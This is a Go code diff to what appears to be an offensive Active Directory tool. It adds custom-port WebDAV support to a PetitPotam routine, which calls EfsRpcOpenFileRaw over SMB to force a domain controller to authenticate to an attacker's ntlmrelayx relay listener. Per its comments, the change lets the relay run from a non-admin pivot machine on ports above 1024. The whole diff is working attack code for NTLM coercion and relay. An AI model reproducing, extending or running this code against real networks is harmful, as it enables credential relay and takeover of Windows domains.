@@ -23,10 +23,14 @@ const (
 //
 // targetDC is the machine to coerce (e.g., a domain controller).
 // listenerIP is the attacker's relay listener (where ntlmrelayx is running).
-func CoerceNTLMAuth(targetDC, listenerIP string, method CoerceMethod) error {
+// listenerPort is the port for the relay listener. When non-zero, WebDAV-style
+// UNC paths (\\ip@port/path) are used so the target sends HTTP auth to the
+// custom port instead of SMB to 445. This allows relaying from a non-admin
+// pivot machine using ports >1024.
+func CoerceNTLMAuth(targetDC, listenerIP string, listenerPort int, method CoerceMethod) error {
 	switch method {
 	case CoercePetitPotam:
-		return petitPotam(targetDC, listenerIP)
+		return petitPotam(targetDC, listenerIP, listenerPort)
 	case CoercePrinterBug:
 		return printerBug(targetDC, listenerIP)
 	default:
@@ -257,8 +261,12 @@ func (s *smbSession) readPipe() ([]byte, error) {
 // The target DC connects back to the listener IP via SMB to access the UNC path.
 //
 // Protocol: DCE/RPC over named pipe \pipe\efsrpc (or \pipe\lsarpc) on port 445.
-func petitPotam(targetDC, listenerIP string) error {
-	fmt.Printf("[*] PetitPotam: Triggering NTLM auth from %s to %s\n", targetDC, listenerIP)
+func petitPotam(targetDC, listenerIP string, listenerPort int) error {
+	if listenerPort > 0 {
+		fmt.Printf("[*] PetitPotam: Triggering NTLM auth from %s to %s:%d (WebDAV/HTTP)\n", targetDC, listenerIP, listenerPort)
+	} else {
+		fmt.Printf("[*] PetitPotam: Triggering NTLM auth from %s to %s (SMB/445)\n", targetDC, listenerIP)
+	}
 
 	conn, err := net.DialTimeout("tcp", targetDC+":445", 10*time.Second)
 	if err != nil {
@@ -293,7 +301,14 @@ func petitPotam(targetDC, listenerIP string) error {
 			continue
 		}
 
-		uncPath := fmt.Sprintf(`\\%s\share\file.txt`, listenerIP)
+		// WebDAV UNC path: \\ip@port/share triggers HTTP auth to custom port
+		// Standard UNC:    \\ip\share triggers SMB auth to port 445
+		var uncPath string
+		if listenerPort > 0 {
+			uncPath = fmt.Sprintf(`\\%s@%d\share\file.txt`, listenerIP, listenerPort)
+		} else {
+			uncPath = fmt.Sprintf(`\\%s\share\file.txt`, listenerIP)
+		}
 		if err := efsRpcOpenFileRaw(s, uncPath); err != nil {
 			pipeErr = fmt.Errorf("EfsRpcOpenFileRaw: %w", err)
 			continue
